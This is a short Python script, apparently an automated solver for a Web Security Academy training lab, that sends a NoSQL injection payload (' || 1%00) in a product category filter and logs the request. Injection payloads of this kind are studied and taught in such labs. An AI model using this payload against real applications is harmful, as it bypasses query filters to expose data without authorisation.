from web_security_academy.core.logger import logger


def solve_lab(session):
    nosqli = "/filter?category=' || 1%00"
    session.get_path(nosqli)
    logger.info(f"Visited {nosqli}")
